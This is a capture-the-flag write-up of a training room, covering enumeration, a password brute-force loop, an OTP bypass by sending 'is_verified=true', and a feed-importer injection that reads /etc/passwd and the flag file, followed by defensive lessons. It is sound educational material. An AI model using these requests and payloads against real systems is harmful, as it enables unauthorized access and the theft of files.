# MediaHub — Complete Room Write-up

**Author:** hyena11
**Date:** July 2, 2026
**Target:** MediaHub Server (`10.48.187.93`)
**Objective:** Full compromise via chained web vulnerabilities

> Note: Flags in this write-up are **redacted**. Solve the room yourself to capture the real values — this doc is meant to show the *path*, not hand out the answer.

---

## Table of Contents

1. [Introduction](#introduction)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Discovery Phase](#discovery-phase)
4. [Exploitation Process](#exploitation-process)
5. [Command Injection and Privilege Escalation](#command-injection-and-privilege-escalation)
6. [Attack Chain Summary](#attack-chain-summary)
7. [Vulnerability Summary](#vulnerability-summary)
8. [Security Recommendations](#security-recommendations)
9. [Conclusion](#conclusion)

---

## Introduction

This write-up documents a full pentest of the MediaHub challenge box. The path to full compromise touched an exposed backup file, hardcoded staging credentials, a client-side-only 2FA "verification" flow, and a server-side command/SSRF-style injection in a feed-import feature — chained together to reach local file read on the host.

---

## Initial Reconnaissance

### Directory Enumeration

Started with `ffuf` against the target:

```bash
ffuf -u http://10.48.187.93/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -fc 404,403 \
     -c -t 100 \
     -e .php,.html,.txt,.bak,.old,.js,.css,.json,.xml,.yml,.conf
```

### Open Directory Listing — /assets/

Enumeration turned up an open, unauthenticated directory listing at `/assets/`:

![Open directory listing of /assets](assets/FoundAssets.png)

```
Index of /assets
- bootstrap-icons.css
- bootstrap-icons.woff
- bootstrap-icons.woff2
- bootstrap-icons/
- bootstrap.bundle.min.js
- bootstrap.min.css
- core.js
- jquery-3.6.3.js
- styles.css
```

This confirmed the stack: Bootstrap 5, jQuery 3.6.3, and a custom `core.js` worth reviewing later for client-side logic.

A second open listing was found at `/uploads/`, which later becomes relevant once the profile-picture upload feature is used:

![Open directory listing of /uploads](assets/Uploads.png)

---

## Discovery Phase

### Backup File Exposure — login.php.bak

Guessing at common backup extensions off `login.php` paid off immediately:

```bash
curl http://10.48.187.93/login.php.bak
```

![Curling the exposed .bak file](assets/FoungPassword.png)

The leaked source contained a developer comment left in from staging:

```php
/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
```

Takeaway: admin email `admin@mediahub.thm`, and a predictable password *pattern* (`MediaHub` + a 4-digit year) instead of an actual leaked password — enough to brute force in a handful of tries.

---

## Exploitation Process

### Phase 1 — SQL Injection Probe

Before brute-forcing, I checked whether the login endpoint was SQLi-vulnerable (classic `' OR '1'='1` on the email field, sent via a Burp Repeater tab):

![Burp Repeater testing OR 1=1 injection on api_login.php](assets/ChanginClinedSideCode.png)

```http
PATCH /api_login.php HTTP/1.1
Host: 10.48.187.93
Content-Type: multipart/form-data; boundary=...

------boundary
Content-Disposition: form-data; name="email"

admin ' OR '1'='1
------boundary
Content-Disposition: form-data; name="password"

123
------boundary--
```

Response:
```json
{"ok":false,"error":"Email and password are required."}
```

No SQLi — the endpoint validated the fields but didn't leak anything useful this way, so I pivoted to credential guessing.

### Phase 2 — Credential Brute Force

Using the leaked password format from the .bak file:

```bash
for year in {2020..2026}; do
    echo "Testing MediaHub$year..."
    curl -X POST http://10.48.187.93/api_login.php \
         -d "email=admin@mediahub.thm&password=MediaHub$year"
done
```

Result: `MediaHub2026` authenticated successfully.

### Phase 3 — 2FA / OTP Bypass

Login was gated behind a One-Time-Password screen (`/otp.php`) backed by `verify_otp.php`. Sending an invalid code, as expected, failed:

```http
POST /verify_otp.php HTTP/1.1
Content-Type: multipart/form-data

otp=123456
```
```json
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

The response body echoing back `is_verified:false` was the tell. In Burp Repeater, instead of submitting an `otp` value, I submitted the flag the server itself was echoing:

![Burp Repeater sending is_verified=true directly to verify_otp.php](assets/Intersceptor.png)

```http
POST /verify_otp.php HTTP/1.1
Content-Type: multipart/form-data; boundary=...

------boundary
Content-Disposition: form-data; name="is_verified"

true
------boundary--
```

Response:
```json
{"ok":true,"message":"OTP verified. Redirecting..."}
```

The server trusted a client-supplied `is_verified` flag instead of independently confirming the OTP had been validated — a textbook example of trusting client input for an authorization decision.

This granted admin dashboard access, confirmed with an in-app flag banner for this stage of the room:

![Admin dashboard reached after 2FA bypass, with the stage flag banner redacted](assets/Got_the_dashboard.png)

> Flag for this stage (2FA bypass): `THM{█████████████████████}` (redacted)

### Phase 4 — Dashboard Recon

The admin dashboard exposed two features of interest:

1. Change Profile Picture — file upload, saved to the previously-discovered `/uploads/` directory
2. Import Feed — an RSS/Atom fetcher that hits a URL server-side

---

## Command Injection and Privilege Escalation

### Spotting a Client-Side-Only Filter

The "Import Feed" front-end JS sanitized the URL before sending it:

```javascript
const url1 = (feedUrl.value || "").trim();
const url = url1.replace(/[;&|]/g, '');

const fd = new FormData();
fd.append("url", url);
fetch("import_feed_api.php", {
    method: "POST",
    body: fd
});
```

Stripping `;`, `&`, and `|` in JavaScript does nothing to stop a direct HTTP request built in Burp — the filter never runs server-side.

### Exploiting import_feed_api.php

Sending the request straight to the backend, bypassing the JS entirely, and chaining a `file://` read after a throwaway `http://127.1` target:

```http
POST /import_feed_api.php HTTP/1.1
Host: 10.48.187.93
Cookie: PHPSESSID=<session>
Content-Type: application/x-www-form-urlencoded

url=http://127.1; file:///etc/passwd
```

![Response leaking /etc/passwd through the feed importer](assets/Fetched_etc_passwd.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
...
```

Why `127.1` worked: it's shorthand for `127.0.0.1`, which is enough to satisfy whatever the server treats as a "valid" host before the injected `; file://` segment gets interpreted separately.

### Reading the Root Flag

Pivoting the same technique at the flag file:

```http
POST /import_feed_api.php HTTP/1.1
Host: 10.48.187.93

url=http://127.1; file:///var/www/user.txt
```

![Final response containing the fully-redacted root flag](assets/ReadTheFile.png)

```
THM{███████████████████████}   (redacted)
```

Room completion confirmed:

![Room completion / progress screen](assets/Pwned.png)

---

## Attack Chain Summary

```
Open directory listing (/assets, /uploads)
        |
        v
login.php.bak discovered -> admin email + password pattern leaked
        |
        v
Credential brute force -> MediaHub2026 works
        |
        v
2FA bypass -> is_verified=true sent directly, server trusts it
        |
        v
Admin dashboard access
        |
        v
Import Feed feature -> client-side-only filter bypassed in Burp
        |
        v
file:// injection -> /etc/passwd read
        |
        v
file:// injection -> flag file read -> full compromise
```

---

## Vulnerability Summary

| # | Vulnerability | Severity | Impact |
|---|---|---|---|
| 1 | Backup file exposure (`login.php.bak`) | High | Credential/format disclosure |
| 2 | Predictable/hardcoded staging credentials | Critical | Unauthorized admin access |
| 3 | Open directory listing (`/assets/`, `/uploads/`) | Medium | Information disclosure |
| 4 | 2FA bypass via trusted client parameter (`is_verified`) | Critical | Authentication bypass |
| 5 | Server-side command/file injection in feed importer | Critical | Local file read / full compromise |
| 6 | Security filtering implemented client-side only | High | Trivial security control bypass |

---
#  Lessons Learned


**Client-side controls are not security controls.**

Every stage of this chain — the 2FA check, the URL filter on the feed importer — ultimately failed for the same underlying reason: logic that should have been enforced by the server was instead enforced (or only enforced) in the browser. A tool like Burp Suite removes the browser from the equation entirely, so any control that lives only in JavaScript is trivially bypassed by sending the request directly.

---

## Skills Reinforced

### Reconnaissance
- Directory enumeration with `ffuf` to surface content not linked from the application itself.
- Recognizing that backup and temporary files (`.bak`, `.old`, `.tmp`) are commonly left behind after deployments and often contain source code, credentials, or configuration detail.
- Treating open directory listings as a source of both direct information disclosure and clues about the technology stack in use.

### Credential Analysis
- Distinguishing between a fully leaked credential and a leaked *pattern* (e.g., a password format rather than the password itself), and recognizing that the latter is still sufficient for a small, targeted brute-force attempt.

### Authentication and Session Logic
- Identifying when an application state (such as an "is verified" flag) is being trusted from client input rather than derived and stored server-side.
- Understanding that an API response echoing internal state (e.g., `is_verified:false` in an error response) can itself be a signal that the field is client-writable.

### Input Handling and Injection
- Recognizing that a regex-based filter implemented in JavaScript has no bearing on what the server will accept, since the request can be constructed and sent independently of the page that generated it.
- Understanding how a permissive URL-fetching feature (an "import feed" style function) can be abused via scheme smuggling — in this case, chaining a throwaway network target with a `file://` reference to read arbitrary local files.
- Practicing the general pattern of testing any feature that fetches a user-supplied URL server-side for both SSRF and local file disclosure.

### Tooling
- Using Burp Suite Repeater to construct and resend requests independent of the front-end, bypassing any purely client-side logic.
- Building raw HTTP requests by hand to control exactly which parameters, headers, and values are sent.

---

## Defensive Takeaways

| Weakness Observed | Underlying Principle | Recommended Fix |
|---|---|---|
| Backup file left in webroot | Deployment hygiene | Exclude non-runtime files from the web root; rely on version control instead of in-place backups |
| Predictable credential format | Credential management | Use randomly generated, per-environment secrets stored in a vault or environment variables |
| Verification state accepted from client | Trust boundary placement | Store and check authentication/verification state server-side, tied to the session |
| URL filtering implemented only in JavaScript | Defense placement | Enforce validation, allow-listing, and scheme restrictions on the server, not the client |
| Unrestricted server-side URL fetch | Input validation | Reject non-HTTP(S) schemes explicitly; validate destinations against an allow-list before fetching |

---

## Broader Principle

No individual weakness in this exercise was severe in isolation. The full compromise was possible because several small gaps were layered in the same direction — each one removing a check that should have existed independently of the others. This reinforces a standard security engineering principle: controls should be redundant and independently enforced, so that the failure of one does not cascade into the failure of the whole system.

---

## Summary

| Area | Lesson |
|---|---|
| Reconnaissance | Unlinked and backup files are frequently discoverable and frequently sensitive |
| Credentials | A leaked pattern is as dangerous as a leaked value if the search space is small |
| Authentication | Verification and authorization state must be authoritative on the server |
| Input validation | Client-side filtering provides no protection against a direct request |
| SSRF / file access | URL-fetching features require server-side scheme and destination validation |
| General | Security failures are typically the result of several small gaps aligning, not one catastrophic flaw |

---

*This document accompanies the technical write-up and is intended for personal reference and future application to similar engagements.*

## Security Recommendations

Backup files
- Never leave `.bak`/`.old` copies inside the webroot; keep them out of any publicly served directory and under version control instead.

Credentials
- No hardcoded or "formulaic" passwords, even for staging. Use per-environment secrets pulled from a vault or environment variables, and rotate them.

2FA / authentication state
- All verification state (`is_verified`, session role, etc.) must be tracked and checked server-side, keyed to the session — never accepted as a client-submitted parameter.

Import Feed / SSRF surface
- Validate and allow-list destinations server-side; reject non-`http(s)` schemes explicitly (block `file://`, `gopher://`, `dict://`, etc.).
- Never build shell/network calls by concatenating user input; if shelling out is unavoidable, use proper argument-array APIs instead of string concatenation, and drop reliance on client-side sanitization entirely.

General
- Disable directory listing on all web-served directories.
- Restrict uploaded file permissions and validate file types server-side.
- Treat every client-side validation/filter as a UX nicety only, never a security boundary.

---

## Conclusion

No single bug here was catastrophic in isolation — an exposed backup file, a predictable password format, a client-trusted boolean, and a filter that only ran in the browser. Chained together, they added up to full read access on the host. The recurring theme is the same one that shows up in most real-world chains like this: trusting the client for anything that matters (validation, verification state, sanitization) is the common thread tying every step together.

Key takeaways:
- Client-side validation is UX, not security.
- Backup files in the webroot are free reconnaissance for an attacker.
- Any state that gates access (like `is_verified`) must be authoritative on the server.
- Server-side input validation is mandatory wherever user input reaches a network call, file path, or command.

---

## Tools Used

- ffuf — directory/content enumeration
- Burp Suite (Repeater) — request interception and modification
- curl — direct HTTP requests and file retrieval

---

*Educational write-up for a training lab environment. Flags redacted intentionally — attempt the room yourself for the full experience.*
